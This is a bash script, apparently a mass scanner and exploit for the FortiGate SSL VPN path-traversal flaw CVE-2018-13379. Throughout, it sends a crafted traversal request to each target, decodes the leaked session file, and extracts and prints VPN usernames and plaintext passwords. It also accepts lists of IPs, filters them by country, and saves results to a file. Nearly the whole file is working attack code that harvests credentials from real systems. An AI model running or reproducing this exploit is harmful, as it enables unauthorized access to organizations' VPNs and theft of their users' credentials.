#!/bin/bash

padding="                                                             "
banner=" _______               _     _______           _     
(_______)         _   (_)   (_______)         | |    
 _____ ___   ____| |_  _ ___ _____ _   _  ____| |  _ 
|  ___) _ \ / ___)  _)| (___)  ___) | | |/ ___) | / )
| |  | |_| | |   | |__| |   | |   | |_| ( (___| |< ( 
|_|   \___/|_|    \___)_|   |_|    \____|\____)_| \_)
                                                     
  ______ _                _                          
 / _____) |              | |                         
| /     | | _   ____ ____| |  _ ____  ____           
| |     | || \ / _  ) ___) | / ) _  )/ ___)          
| \_____| | | ( (/ ( (___| |< ( (/ /| |              
 \______)_| |_|\____)____)_| \_)____)_|     4 CVE 2018-13379
_____________________________________________________________\n
"

tabHeader="+--------------------+--------------------+
|      Username      |      Password      |
+--------------------+--------------------+"


help(){

  echo "
-h      Get this help message
-t      Insert a valid IP Address to check. IP:port
-l      Provide a path to a file containing a list of IPs, one per line IP:port
-c      Provide a country name if you're interested in a specific country's IPs
-o      Output filename
"
}

checkIP(){

          if [[ "$1" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5])):([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$ ]]; then
            
            return
        
                  else
        
                    printf "%s\033[K\n" "Insert a valid IP:port combination"
                    exit
        
          fi
}

checkVuln(){

            vuln=0
            ip=$1
            url="https://$ip/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
            tmp="$(curl --max-time 10 -k -s $url | xxd -p | sed 's/.\{4\}/& /g' | tr -d '\n' | sed -e ':loop' -e 's/0000 0000 */0000 /g' -e 't loop' -e 's/0000 /0x0a /g' | xxd -p -r | tr -d '\0' )"
            
            if grep -q "var fgt_lang =" <<< $tmp; then
        
                      vuln=1
        
                    elif [ "$tmp" == "" ]; then
        
                      vuln=2
        
            fi
}

showcreds(){
            
            if [[ "$creds" != "" ]]; then

              printf "%s\n" "$tabHeader"
    
                  while read line; do
                    
                    user=$(echo "$line" | cut -d " " -f 2)
                    pwd=$(echo "$line" | cut -d " " -f 3)
                    
                    printf "%s %s\n" "| $user" "${padding:$((43 + ${#user}))}| $pwd ${padding:$((43 +${#pwd}))}|" 
                
                    done <<< $1
    
                printf "%s\n" "+--------------------+--------------------+"
            fi
}

main(){

      if [ "$target" == "" ]; then
        count=1
        file=$1
        country=$2
        totalLines=$(wc -l < $file)

        while IFS= read -r line; do
          
          printf "%s %s %s\033[K\r" "$count) $line | $count of $totalLines " "${padding:$((${#count}*2 + 11 + ${#line} + ${#totalLines}))}" "Checking"
          if [ "$country" == "" ]  ; then

            checkVuln $line
            
            if [ "$vuln" == "1" ]; then

              printf "%s %s \e[45m%s\e[0m\n" "$count) $line" "${padding:$((${#count} + 3 + ${#line}))}" "Vulnerable"
              creds=$(grep -E -A 2 -a "([0-9]{1,3}[\.]){3}[0-9]{1,3}.*" <<< "$tmp" | sed  -e 's/--/\n/g' -e 's/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}//g' | tr '\n' ' ' | sed -e 's/    */\n/g')
              showcreds "$creds"

            elif [ "$vuln" == "2" ]; then

              printf "%s %s \e[43m%s\e[0m\n" "$count) $line" "${padding:$((${#count} + 3 + ${#line}))}" "Timed out"

            else

              printf "%s %s %s\n" "$count) $line" "${padding:$((${#count} + 3 + ${#line}))}" "Not Vulnerable"

            fi

          else
          
            ip=$(cut -d : -f 1 <<< $line)
            infos=$(curl -k -s http://ip-api.com/csv/$ip?fields=country)

            if grep -q "$country" <<< $infos; then

              checkVuln $line
              
              if [ "$vuln" == "1" ]; then 
            
                printf "%s %s \e[45m%s\e[0m\n" "$count) $line" "${padding:$((${#count} + 3 + ${#line}))}" "Vulnerable"
                creds=$(grep -E -A 2 -a "([0-9]{1,3}[\.]){3}[0-9]{1,3}.*" <<< "$tmp" | sed  -e 's/--/\n/g' -e 's/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}//g' | tr '\n' ' ' | sed -e 's/    */\n/g')
                showcreds "$creds"

              elif [ "$vuln" == "2" ]; then

                printf "%s %s \e[43m%s\e[0m\n" "$count) $line" "${padding:$((${#count} + 3 + ${#line}))}" "Timed out"

              else

                printf "%s %s %s\n" "$count) $line" "${padding:$((${#count} + 3 + ${#line}))}" "Not Vulnerable"

              fi
            fi  
          fi
          count=$(($count+1));
        done < $file

      else

        printf "%s %s %s\033[K\r" "1) $target | 1 of 1 " "${padding:$((14 + ${#target}))}" "Checking"
        checkIP $target
        checkVuln $target
                
        if [ "$vuln" == "1" ]; then

          printf "%s %s \e[45m%s\e[0m\n" "1) $target" "${padding:$((4 + ${#target}))}" "Vulnerable"
          creds=$(grep -E -A 2 -a "([0-9]{1,3}[\.]){3}[0-9]{1,3}.*" <<< "$tmp" | sed  -e 's/--/\n/g' -e 's/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}//g' | tr '\n' ' ' | sed -e 's/    */\n/g')
          showcreds "$creds"

        elif [ "$vuln" == "2" ]; then

          printf "%s %s \e[43m%s\e[0m\n" "1) $target" "${padding:$((4 + ${#target}))}" "Timed out"

        else
         
         printf "%s %s %s\n" "$target" "${padding:$((4 + ${#target}))}" "Not Vulnerable"

        fi
      fi
      printf "%s\033[K\n" "DONE!"
}

##################----------MAIN PROGRAM----------##################

while getopts 'ht:l:c:o:' OPTION; do
  case "$OPTION" in
    h|--help)
      printf "$banner"
      help
      exit
      ;;
    t|--target)
      target=${OPTARG}
      ;;
    c|--country)
      country=${OPTARG}
      ;;
    l|--file)
      file=${OPTARG}
      ;;
    o|--output)
    outfile=${OPTARG}
    ;;
    \?)
      echo "script usage: $(basename $0) [-h] [-l] [-t target] [-c country] [-o path to file]" >&2
      exit 1
      ;;
  esac
done


if [ "$outfile" != "" ]; then

  exec 1> >(tee -a $outfile)

fi

printf "$banner"

if (( "$OPTIND" == 1 )) ; then 

  help
  exit
fi 

main $target $file $country
shift "$(($OPTIND -1))"